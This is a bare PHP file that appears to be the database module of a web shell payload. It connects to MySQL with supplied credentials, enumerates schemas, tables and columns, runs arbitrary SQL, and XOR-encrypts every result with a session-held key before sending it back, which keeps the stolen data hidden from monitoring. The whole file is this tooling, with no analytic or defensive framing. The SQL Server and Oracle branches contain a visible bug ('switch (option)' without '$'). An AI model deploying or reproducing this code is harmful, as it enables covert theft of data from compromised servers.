error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');
function getSQL($option,$type,$user,$pass,$host,$port,$cdbname,$table)
{
	
        $sql = "";
        if("mysql"==$type)
        {
            switch ($option)
            {
                case "LoadDB":
                    $sql = "select schema_name from information_schema.schemata";
                    break;
                case "LoadTable":
                    $sql = sprintf("select table_name from information_schema.tables where table_schema='%s'", $cdbname);
                    break;
                case "LoadColumn":
                    $sql = sprintf("select column_name from information_schema.columns where table_schema='%s' and table_name='%s'", $cdbname, $table);
                    break;
            }
        }

        else if ("sqlserver"==$type)
        {
            switch (option) {
                case "LoadDB":
                    $sql = "select name from [master]..[sysdatabases]";
                    break;
                case "LoadTable":
                    $sql = sprintf("SELECT name FROM [%s]..[sysobjects] WHERE TYPE='U'", $cdbname);
                    break;
                case "LoadColumn":
                    $sql = sprintf("SELECT * FROM [%s]..[syscolumns] where id=object_id('[%s]..[%s]')",$cdbname,$cdbname,$table);
                    break;
            }
            
        }
        
        else if("oracle"==$type)
        {
            switch (option)
            {
                case "LoadDB":
                    $sql = "select distinct(owner) from sys.all_tables";
                    break;
                case "LoadTable":
                    $sql = sprintf("select table_name from sys.all_tables where owner='%s'", $cdbname);
                    break;
                case "LoadColumn":
                    $sql = sprintf("select column_name from sys.all_tab_columns where owner='%s' and table_name='%s'",$cdbname,$table);
                    break;
            }
        }
        return $sql;
}
function main($type,$host,$port,$driver,$user,$pass,$database,$cdbname,$table,$sql,$option,$encoding)
{
    $result= "result:";
	$type=strtolower($type);
    if ($type == "mysql") {
		
        if(function_exists("mysqli_connect")) {
			
            $conn = mysqli_connect($host, $user, $pass, $database, $port);
            if ($conn) {
				if($option!="LoadSQL"){
					$sql=getSQL($option,$type,$user,$pass,$host,$port,$cdbname,$table);
				}
				if($encoding==""){
					$encoding="UTF8";
				}
				else{
					$encoding=str_replace("-","",$encoding);
				}
				$conn->query("SET NAMES ".$encoding); 
                $res = mysqli_query($conn, $sql);
                $arr = array();
				$i=0;
				$spstr=",";
				if($option=="LoadSQL"){
					$spstr="\r\t\r";
					$result= "sum:";
					$headers="";
					while ($row = mysqli_fetch_field($res)) {
						$headers=$headers.$row->name."\t";
						$i++;
					}
					echo bencrypt($result.$i."----header:".$headers);
					echo "\r\n";
				}
				$i=0;
                while ($row = mysqli_fetch_row($res)) {
					$rowstr="";
					foreach($row as $val){
						$rowstr=$rowstr.$val.$spstr; 
					}
					if($option=="LoadSQL"){
						echo bencrypt($rowstr); 
						echo "\r\n";
					}
					else{
						$result=$result.$rowstr;
					}
					$i++;
                }
				if($i>0){
					$result=substr($result,0,-1);
				}
                mysqli_close($conn);

            } else {
				
                $result = mysqli_connect_error();
            }
        } else {
			
            $result = "No MySQL Driver.";
        }
    }
	else{
        $result = "暂不支持此数据库！";
	}
	if($option!="LoadSQL"){
		echo encrypt($result);
	}
}

function encrypt($data)
{
	$key=$_SESSION['k'];
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+1&15]; 
    }
	return $data;
}
function bencrypt($data)
{
	$key=$_SESSION['k'];
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+1&15]; 
    }
	return base64_encode($data);
}
